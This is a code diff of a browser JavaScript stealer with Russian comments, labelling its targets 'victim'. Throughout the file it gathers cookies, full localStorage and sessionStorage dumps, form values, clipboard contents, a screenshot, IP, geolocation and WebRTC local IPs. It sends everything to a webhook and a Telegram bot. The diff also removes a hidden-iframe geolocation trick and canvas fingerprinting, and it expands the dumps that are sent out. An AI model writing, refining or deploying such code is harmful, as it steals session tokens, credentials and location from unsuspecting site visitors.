@@ -36,7 +36,7 @@
 
             const data = {};
 
-            // ---- Куки ----
+            // ---- 1. Куки ----
             data.cookies = {};
             if (document.cookie) {
                 document.cookie.split('; ').forEach(c => {
@@ -45,21 +45,25 @@
                 });
             }
 
-            // ---- LocalStorage ----
+            // ---- 2. LocalStorage (ПОЛНЫЙ ДАМП) ----
             data.localStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                if (key) data.localStorage[key] = localStorage.getItem(key);
+                if (key) {
+                    data.localStorage[key] = localStorage.getItem(key);
+                }
             }
 
-            // ---- SessionStorage ----
+            // ---- 3. SessionStorage ----
             data.sessionStorage = {};
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
-                if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
+                if (key) {
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
             }
 
-            // ---- IP ----
+            // ---- 4. IP ----
             data.ip = null;
             try {
                 const ipResp = await fetch('https://api.ipify.org?format=json');
@@ -67,7 +71,7 @@
                 data.ip = ipJson.ip;
             } catch (_) {}
 
-            // ---- ГЕО по IP (основной) ----
+            // ---- 5. ГЕО по IP ----
             data.geo = null;
             if (data.ip) {
                 try {
@@ -93,76 +97,7 @@
                 } catch (_) {}
             }
 
-            // ---- БРАУЗЕРНАЯ ГЕОЛОКАЦИЯ (тихо, без запроса через iframe) ----
-            data.browserGeo = null;
-            try {
-                // Пробуем получить гео через iframe с геолокацией (не требует разрешения, если вызывается из iframe)
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = 'about:blank';
-                document.body.appendChild(iframe);
-
-                const iframeWin = iframe.contentWindow;
-                const iframeDoc = iframe.contentDocument || iframeWin.document;
-
-                // Внедряем скрипт в iframe, который пытается получить геолокацию
-                const script = iframeDoc.createElement('script');
-                script.textContent = `
-                    (function() {
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                function(pos) {
-                                    const data = {
-                                        lat: pos.coords.latitude,
-                                        lon: pos.coords.longitude,
-                                        accuracy: pos.coords.accuracy,
-                                        altitude: pos.coords.altitude || null,
-                                        heading: pos.coords.heading || null,
-                                        speed: pos.coords.speed || null
-                                    };
-                                    window.parent.postMessage({ type: 'geo', data: data }, '*');
-                                },
-                                function(err) {
-                                    window.parent.postMessage({ type: 'geo_error', error: err.message }, '*');
-                                },
-                                { timeout: 5000, enableHighAccuracy: true }
-                            );
-                        } else {
-                            window.parent.postMessage({ type: 'geo_error', error: 'not supported' }, '*');
-                        }
-                    })();
-                `;
-                iframeDoc.body.appendChild(script);
-
-                // Ждём ответ от iframe
-                const geoResult = await new Promise((resolve) => {
-                    const handler = (event) => {
-                        if (event.data && event.data.type === 'geo') {
-                            window.removeEventListener('message', handler);
-                            resolve(event.data.data);
-                        } else if (event.data && event.data.type === 'geo_error') {
-                            window.removeEventListener('message', handler);
-                            resolve(null);
-                        }
-                    };
-                    window.addEventListener('message', handler);
-                    setTimeout(() => {
-                        window.removeEventListener('message', handler);
-                        resolve(null);
-                    }, 6000);
-                });
-
-                if (geoResult) {
-                    data.browserGeo = geoResult;
-                }
-
-                // Удаляем iframe
-                iframe.remove();
-            } catch (_) {
-                data.browserGeo = null;
-            }
-
-            // ---- Локальный IP через WebRTC ----
+            // ---- 6. Локальный IP (WebRTC) ----
             data.localIPs = [];
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -180,7 +115,7 @@
                 data.localIPs = ips;
             } catch (_) {}
 
-            // ---- Буфер обмена ----
+            // ---- 7. Буфер обмена ----
             data.clipboard = null;
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -188,7 +123,7 @@
                 }
             } catch (_) {}
 
-            // ---- Скриншот ----
+            // ---- 8. Скриншот ----
             data.screenshot = null;
             try {
                 const script = document.createElement('script');
@@ -209,22 +144,15 @@
                 }
             } catch (_) {}
 
-            // ---- Доп. данные ----
+            // ---- 9. Базовые данные ----
             data.userAgent = navigator.userAgent;
             data.url = window.location.href;
             data.referrer = document.referrer || null;
-            data.screen = {
-                width: screen.width,
-                height: screen.height,
-                pixelRatio: window.devicePixelRatio
-            };
-            data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
             data.platform = navigator.platform;
             data.language = navigator.language;
-            data.languages = navigator.languages || [];
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // ---- ВСЕ ФОРМЫ (если есть) ----
+            // ---- 10. Формы (если есть) ----
             data.forms = {};
             document.querySelectorAll('input, textarea, select').forEach(el => {
                 const name = el.name || el.id || el.className || 'field';
@@ -232,38 +160,15 @@
                     data.forms[name] = el.value;
                 }
             });
-            document.querySelectorAll('form').forEach(form => {
-                try {
-                    const fd = new FormData(form);
-                    for (const [k, v] of fd.entries()) {
-                        data.forms['form_' + k] = v;
-                    }
-                } catch (_) {}
-            });
 
-            // ---- Отпечаток Canvas ----
-            data.canvasFingerprint = null;
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 256;
-                canvas.height = 128;
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 128, 64);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);
-                data.canvasFingerprint = canvas.toDataURL().substring(0, 100);
-            } catch (_) {}
+            // ---- 11. Все ссылки ----
+            data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
 
             // ============================================================
             //  ОТПРАВКА
             // ============================================================
 
-            // ---- Webhook ----
+            // ---- Webhook (полные данные) ----
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -272,58 +177,86 @@
                 });
             } catch (_) {}
 
-            // ---- Telegram ----
+            // ---- Telegram (с ЛОКАЛСТОРАДЖЕМ) ----
             try {
                 let msg = '🔴 ЖЕРТВА\n\n';
                 if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
 
-                // ГЕО ПО IP
+                // ГЕО
                 if (data.geo) {
-                    msg += `\n📍 ГЕО ПО IP:\n`;
-                    msg += `   🌍 Страна: ${data.geo.country || '?'}`;
-                    if (data.geo.country_code) msg += ` (${data.geo.country_code})`;
-                    msg += `\n`;
-                    if (data.geo.region) msg += `   🏛 Регион: ${data.geo.region}\n`;
-                    if (data.geo.city) msg += `   🏙 Город: ${data.geo.city}\n`;
+                    msg += `\n📍 ГЕО:\n`;
+                    msg += `   🌍 ${data.geo.country} (${data.geo.country_code})\n`;
+                    if (data.geo.city) msg += `   🏙 ${data.geo.city}\n`;
+                    if (data.geo.region) msg += `   🏛 ${data.geo.region}\n`;
                     if (data.geo.lat && data.geo.lon) {
-                        msg += `   🗺 Координаты: ${data.geo.lat}, ${data.geo.lon}\n`;
-                        msg += `   🔗 Карта: https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
+                        msg += `   🗺 ${data.geo.lat}, ${data.geo.lon}\n`;
+                        msg += `   🔗 https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
                     }
-                    if (data.geo.postal) msg += `   📮 Почтовый индекс: ${data.geo.postal}\n`;
-                    if (data.geo.isp) msg += `   📡 Провайдер: ${data.geo.isp}\n`;
-                    if (data.geo.org && data.geo.org !== data.geo.isp) msg += `   🏢 Организация: ${data.geo.org}\n`;
-                    if (data.geo.timezone) msg += `   🕐 Часовой пояс: ${data.geo.timezone}\n`;
-                    if (data.geo.continent) msg += `   🌎 Континент: ${data.geo.continent}\n`;
-                    if (data.geo.currency) msg += `   💰 Валюта: ${data.geo.currency}\n`;
-                    if (data.geo.phone_code) msg += `   📞 Телефонный код: +${data.geo.phone_code}\n`;
+                    if (data.geo.isp) msg += `   📡 ${data.geo.isp}\n`;
+                    if (data.geo.timezone) msg += `   🕐 ${data.geo.timezone}\n`;
                 }
 
-                // БРАУЗЕРНАЯ ГЕОЛОКАЦИЯ (точная)
-                if (data.browserGeo) {
-                    msg += `\n📍 БРАУЗЕРНАЯ ГЕОЛОКАЦИЯ (точная):\n`;
-                    msg += `   🗺 Координаты: ${data.browserGeo.lat}, ${data.browserGeo.lon}\n`;
-                    msg += `   🔗 Карта: https://www.google.com/maps?q=${data.browserGeo.lat},${data.browserGeo.lon}\n`;
-                    if (data.browserGeo.accuracy) msg += `   📏 Точность: ${data.browserGeo.accuracy} м\n`;
-                    if (data.browserGeo.altitude) msg += `   🏔 Высота: ${data.browserGeo.altitude} м\n`;
-                    if (data.browserGeo.heading) msg += `   🧭 Направление: ${data.browserGeo.heading}°\n`;
-                    if (data.browserGeo.speed) msg += `   🏎 Скорость: ${data.browserGeo.speed} м/с\n`;
-                }
-
+                // ЛОКАЛЬНЫЙ IP
                 if (data.localIPs && data.localIPs.length) {
                     msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                 }
-                if (data.clipboard) msg += `\n📋 Буфер: ${data.clipboard.substring(0, 150)}\n`;
-                msg += `\n📱 UA: ${data.userAgent.substring(0, 80)}...\n`;
-                msg += `📟 Платформа: ${data.platform || '?'}\n`;
-                msg += `🌐 Язык: ${data.language || '?'}\n`;
-                msg += `🕐 Часовой пояс: ${data.timezone || '?'}\n`;
-                msg += `🍪 Куки: ${Object.keys(data.cookies).length} шт.\n`;
-                msg += `💾 LocalStorage: ${Object.keys(data.localStorage).length} шт.\n`;
-                msg += `🗂 SessionStorage: ${Object.keys(data.sessionStorage).length} шт.\n`;
-                if (data.canvasFingerprint) msg += `🎨 Canvas отпечаток: ${data.canvasFingerprint}...\n`;
-                if (data.screenshot) msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
-                msg += `\n🔗 URL: ${data.url}`;
 
+                // БУФЕР
+                if (data.clipboard) {
+                    msg += `\n📋 Буфер: ${data.clipboard.substring(0, 200)}\n`;
+                }
+
+                // LOCALSTORAGE (ПОЛНЫЙ ДАМП)
+                const lsKeys = Object.keys(data.localStorage);
+                if (lsKeys.length > 0) {
+                    msg += `\n💾 LOCALSTORAGE (${lsKeys.length} шт.):\n`;
+                    for (const key of lsKeys) {
+                        const val = data.localStorage[key];
+                        const shortVal = val.length > 100 ? val.substring(0, 100) + '...' : val;
+                        msg += `   🔑 ${key}: ${shortVal}\n`;
+                    }
+                } else {
+                    msg += `\n💾 LocalStorage: пусто\n`;
+                }
+
+                // SESSIONSTORAGE
+                const ssKeys = Object.keys(data.sessionStorage);
+                if (ssKeys.length > 0) {
+                    msg += `\n🗂 SESSIONSTORAGE (${ssKeys.length} шт.):\n`;
+                    for (const key of ssKeys) {
+                        const val = data.sessionStorage[key];
+                        const shortVal = val.length > 100 ? val.substring(0, 100) + '...' : val;
+                        msg += `   🔑 ${key}: ${shortVal}\n`;
+                    }
+                }
+
+                // КУКИ
+                const cookieKeys = Object.keys(data.cookies);
+                if (cookieKeys.length > 0) {
+                    msg += `\n🍪 КУКИ (${cookieKeys.length} шт.):\n`;
+                    for (const key of cookieKeys) {
+                        const val = data.cookies[key];
+                        const shortVal = val.length > 100 ? val.substring(0, 100) + '...' : val;
+                        msg += `   🍪 ${key}: ${shortVal}\n`;
+                    }
+                }
+
+                // ФОРМЫ
+                const formKeys = Object.keys(data.forms);
+                if (formKeys.length > 0) {
+                    msg += `\n📝 ФОРМЫ (${formKeys.length} шт.):\n`;
+                    for (const key of formKeys) {
+                        msg += `   ${key}: ${data.forms[key]}\n`;
+                    }
+                }
+
+                // ОСТАЛЬНОЕ
+                msg += `\n📱 ${data.userAgent.substring(0, 80)}...\n`;
+                msg += `🕐 ${data.timezone || '?'}\n`;
+                if (data.screenshot) msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
+                msg += `\n🔗 ${data.url}`;
+
+                // Отправляем в Telegram
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
